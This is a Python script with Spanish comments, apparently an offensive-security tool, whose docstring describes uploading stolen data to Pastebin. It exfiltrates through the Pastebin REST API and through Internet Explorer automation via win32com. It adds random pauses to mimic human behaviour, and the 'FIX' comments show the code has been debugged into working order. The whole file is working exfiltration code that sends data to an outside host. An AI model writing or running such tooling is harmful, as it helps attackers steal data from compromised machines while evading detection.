"""
paste_exfil.py - Exfiltración a Pastebin (API directa e Internet Explorer)
===========================================================================
Proporciona dos métodos para subir datos robados a Pastebin:
  - plain_paste(): usa la API REST de Pastebin directamente con `requests`.
  - ie_paste():    automatiza Internet Explorer mediante win32com (Windows).
  
REQUISITOS:
    pip install requests pywin32   # pywin32 solo para ie_paste()

EJEMPLOS DE EJECUCIÓN:
    # Configurar credenciales de Pastebin:
    PASTE_USER=tu_usuario PASTE_PWD=tu_contraseña PASTE_KEY=tu_api_key python paste_exfil.py
"""

import os
import random
import time

import requests
from win32com import client  # Solo disponible en Windows

# -------------------------------------------------------------------
# Credenciales Pastebin — leer desde variables de entorno
# -------------------------------------------------------------------
username    = os.environ.get('PASTE_USER', 'usuario_lab')   # FIX: credencial eliminada
password    = os.environ.get('PASTE_PWD',  '')               # FIX: contraseña eliminada
api_dev_key = os.environ.get('PASTE_KEY',  'YOUR_API_DEV_KEY')


# -------------------------------------------------------------------
# Funciones auxiliares para ie_paste (movidas a nivel de módulo)
# -------------------------------------------------------------------

def wait_for_browser(browser):
    """Espera activa hasta que el documento del IE esté completamente cargado."""
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)


def random_sleep():
    """Pausa aleatoria entre 5 y 10 s para simular comportamiento humano."""
    time.sleep(random.randint(5, 10))


def login(ie):
    """
    Rellena y envía el formulario de login de Pastebin en el objeto IE.

    Args:
        ie: Objeto InternetExplorer.Application de win32com.
    """
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', password)   # FIX: setAttibute → setAttribute

    random_sleep()
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    wait_for_browser(ie)


def submit(ie, title, contents):
    """
    Rellena y envía el formulario de creación de paste en el IE.

    Args:
        ie       : Objeto InternetExplorer.Application de win32com.
        title    (str): Título del paste.
        contents (str): Contenido del paste.
    """
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)   # FIX: setAttibute → setAttribute

    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    random_sleep()
    wait_for_browser(ie)


# -------------------------------------------------------------------
# Funciones públicas de exfiltración
# -------------------------------------------------------------------

def plain_paste(title, contents):
    """
    Sube `contents` a Pastebin usando la API REST oficial.

    Args:
        title    (str):   Nombre/título del paste.
        contents (bytes): Datos a subir (se decodifican a str).
    """
    # Autenticarse para obtener api_user_key
    login_url  = 'https://pastebin.com/api/api_login.php'
    login_data = {
        'api_dev_key':        api_dev_key,
        'api_user_name':      username,
        'api_user_password':  password,
    }
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text

    # Crear el paste
    paste_url  = 'https://pastebin.com/api/api_post.php'
    paste_data = {
        'api_paste_name':    title,
        'api_paste_code':    contents.decode(),
        'api_dev_key':       api_dev_key,
        'api_user_key':      api_user_key,
        'api_option':        'paste',
        'api_paste_private': 0,
    }
    r = requests.post(paste_url, data=paste_data)
    print(r.status_code)
    print(r.text)


def ie_paste(title, contents):
    """
    Sube `contents` a Pastebin automatizando Internet Explorer (Windows).

    Args:
        title    (str):   Nombre/título del paste.
        contents (bytes): Datos a subir (se decodifican a str).
    """
    # FIX: 'InternetExplorer.Aplication' → 'InternetExplorer.Application'
    ie = client.Dispatch('InternetExplorer.Application')
    ie.Visible = 1

    ie.Navigate('https://pastebin.com/login')
    wait_for_browser(ie)
    login(ie)

    ie.Navigate('https://pastebin.com/')
    wait_for_browser(ie)
    submit(ie, title, contents.decode())

    ie.Quit()


if __name__ == '__main__':
    # FIX: bloque movido al nivel de módulo (antes estaba dentro de plain_paste)
    ie_paste('titulo_ejemplo', b'contenido de prueba')
